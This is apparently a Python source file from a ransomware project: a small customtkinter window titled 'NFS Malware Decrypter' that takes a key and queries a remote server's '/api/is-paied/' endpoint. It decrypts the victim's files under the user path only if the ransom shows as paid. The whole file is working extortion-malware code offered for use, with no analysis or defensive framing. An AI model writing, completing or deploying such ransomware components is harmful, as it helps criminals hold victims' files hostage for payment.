import tkinter
import customtkinter
import requests
from env import BASE_API_URL
from encrypter import Encrypter
from device_infos import get_user_path


customtkinter.set_appearance_mode("Dark")
customtkinter.set_default_color_theme("blue")  

app = customtkinter.CTk()
app.title("NFS Malware Decrypter")
app.geometry("350x250")


def decrypt_function():
    input_value= input.get()

    print(input_value)

    response = requests.get(BASE_API_URL + '/api/is-paied/' + input_value)

    if response.status_code == 200:
        is_paid = response.json()

        if is_paid['is_paied'] is True:
            encrypter = Encrypter(input_value)
            encrypter.decrypt(get_user_path(), ('.ini'))


input = customtkinter.CTkEntry(app, placeholder_text="DECRYPT_KEY", width=230, height=35)
input.grid(row=0, column=4, columnspan=2, padx=(60, 30), pady=(60, 30), sticky="nsew")

button = customtkinter.CTkButton(master=app, text="Décrypter", height=40, command=decrypt_function)
button.place(relx=0.5, rely=0.55, anchor=tkinter.CENTER)

app.mainloop()
